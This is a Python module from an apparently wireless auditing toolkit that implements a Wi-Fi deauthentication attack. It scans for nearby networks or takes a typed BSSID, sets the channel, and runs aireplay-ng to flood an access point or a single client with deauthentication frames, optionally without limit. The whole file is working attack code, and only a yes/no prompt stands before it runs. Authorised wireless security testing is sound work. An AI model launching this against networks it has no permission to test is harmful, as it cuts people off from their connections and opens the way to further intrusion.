#!/usr/bin/env python3
"""
Deauthentication attack engine – interactive and advanced options.
"""
import re
import shutil
import subprocess
from typing import Optional
from .core import NetworkAnalyzerCore
from .monitor import MonitorEngine
from .terminal_manager import TerminalManager
from .utils import print_colored, input_colored

class DeauthEngine:
    MAC_PATTERN = re.compile(r'^(?:[0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}$')

    def __init__(self, core: NetworkAnalyzerCore):
        self.core = core
        self.monitor = MonitorEngine(core)
        self.terminal = TerminalManager()

    def ensure_prerequisites(self) -> bool:
        return self.monitor.ensure_monitor_mode(self.core.active_interface) is not None

    def deauth_attack(self, interface: str, bssid: str, client: Optional[str] = None,
                      count: int = 0, channel: Optional[int] = None) -> bool:
        """Launch deauth attack via aireplay-ng."""
        interface = self.monitor.ensure_monitor_mode(
            interface, prompt=False, allow_reselect=False
        )
        if not interface:
            return False
        if not self.core.ensure_root():
            return False
        bssid = str(bssid).strip().upper()
        client = str(client).strip().upper() if client else None
        if not self.MAC_PATTERN.fullmatch(bssid):
            print_colored("Invalid BSSID format.", "red")
            return False
        if client and not self.MAC_PATTERN.fullmatch(client):
            print_colored("Invalid client MAC address.", "red")
            return False
        try:
            count = int(count)
        except (TypeError, ValueError):
            print_colored("Packet count must be a non-negative integer.", "red")
            return False
        if count < 0:
            print_colored("Packet count must be a non-negative integer.", "red")
            return False
        if channel is not None:
            try:
                channel = int(channel)
            except (TypeError, ValueError):
                print_colored("Channel must be an integer from 1 to 196.", "red")
                return False
            if not 1 <= channel <= 196:
                print_colored("Channel must be an integer from 1 to 196.", "red")
                return False
        if not shutil.which('aireplay-ng'):
            print_colored("aireplay-ng is required (provided by aircrack-ng).", "red")
            return False
        print_colored(f"\nDeauthentication Attack", "red", bold=True)
        print_colored("═" * 50, "cyan")
        print_colored(f"Target AP: {bssid}", "yellow")
        if client:
            print_colored(f"Target Client: {client}", "yellow")
        print_colored(f"Packets: {count if count > 0 else 'infinite'}", "yellow")
        print_colored(f"Interface: {interface}", "yellow")
        if channel:
            print_colored(f"Channel: {channel}", "yellow")
        print_colored("═" * 50, "cyan")
        if input_colored("Continue? [y/N]: ", "red").strip().lower() not in ('y', 'yes'):
            return False
        interface = self.monitor.ensure_monitor_mode(
            interface, prompt=False, allow_reselect=False
        )
        if not interface:
            return False
        cmd = ['aireplay-ng', '--deauth', str(count), '-a', bssid]
        if client:
            cmd.extend(['-c', client])
        if channel:
            try:
                tuned = subprocess.run(
                    self.core.privileged_command(['iw', 'dev', interface, 'set', 'channel', str(channel)]),
                    capture_output=True, text=True,
                )
            except OSError as exc:
                print_colored(f"Unable to set channel: {exc}", "red")
                return False
            if tuned.returncode != 0:
                print_colored(f"Unable to set channel: {tuned.stderr.strip()}", "red")
                return False
        cmd.append(interface)
        result = self.terminal.run_live_command(
            "Deauthentication Test", self.core.privileged_command(cmd), interrupt_ok=True,
        )
        return result == 0

    def interactive_deauth(self):
        """Choose discovery or manual entry; cancellation returns to the menu."""
        try:
            return self._interactive_deauth()
        except (KeyboardInterrupt, EOFError):
            print_colored("\nDeauthentication cancelled. Returning to menu.", "yellow")
            return False

    def _interactive_deauth(self):
        print_colored("\nDeauthentication Test", "yellow", bold=True)
        print_colored("═" * 50, "cyan")
        print_colored("  1. Discover networks and select a target", "white")
        print_colored("  2. Enter BSSID manually", "white")
        print_colored("  q. Back to main menu", "white")
        mode = input_colored("Select mode [1/2/q]: ", "green").strip().lower()
        if mode in ('', 'q'):
            return False
        if mode not in ('1', '2'):
            print_colored("Invalid mode.", "red")
            return False
        if not self.ensure_prerequisites():
            return False
        channel = None
        if mode == '1':
            from .discovery import DiscoveryEngine
            discovery = DiscoveryEngine(self.core)
            value = input_colored("Discovery duration in seconds (default 15, q cancels): ", "yellow").strip()
            if value.lower() == 'q':
                return False
            if value and (not value.isdigit() or int(value) < 1):
                print_colored("Duration must be a positive integer.", "red")
                return False
            capture = discovery.scan_networks(duration=int(value) if value else 15)
            if not capture:
                return False
            networks = list({n['bssid']: n for n in discovery.parse_scan_results(capture)}.values())
            if not networks:
                print_colored("No networks found. Try discovery again or use manual mode.", "yellow")
                return False
            for index, network in enumerate(networks, 1):
                print_colored(
                    f"  {index}. {network.get('essid') or 'Hidden'}  {network['bssid']}"
                    f"  CH {network.get('channel', '?')}  {network.get('signal', '?')} dBm", "white",
                )
            choice = input_colored("Select network number (q cancels): ", "green").strip()
            if choice.lower() == 'q':
                return False
            if not choice.isdigit() or not 1 <= int(choice) <= len(networks):
                print_colored("Invalid network selection.", "red")
                return False
            target = networks[int(choice) - 1]
            bssid = target['bssid']
            channel = target.get('channel')
        else:
            bssid = input_colored("Target BSSID (blank cancels): ", "yellow").strip()
            if not bssid:
                return False
        if not self.MAC_PATTERN.fullmatch(bssid):
            print_colored("Invalid BSSID format.", "red")
            return False
        if not channel:
            channel = input_colored("Channel (optional): ", "yellow").strip() or None
        client = input_colored("Client MAC (optional): ", "yellow").strip() or None
        default_count = self.core.config.get('deauth_packets', 100)
        count = input_colored(f"Packets (0=continuous, default {default_count}): ", "yellow").strip()
        return self.deauth_attack(self.core.active_interface, bssid, client,
                                  count if count else default_count, channel)
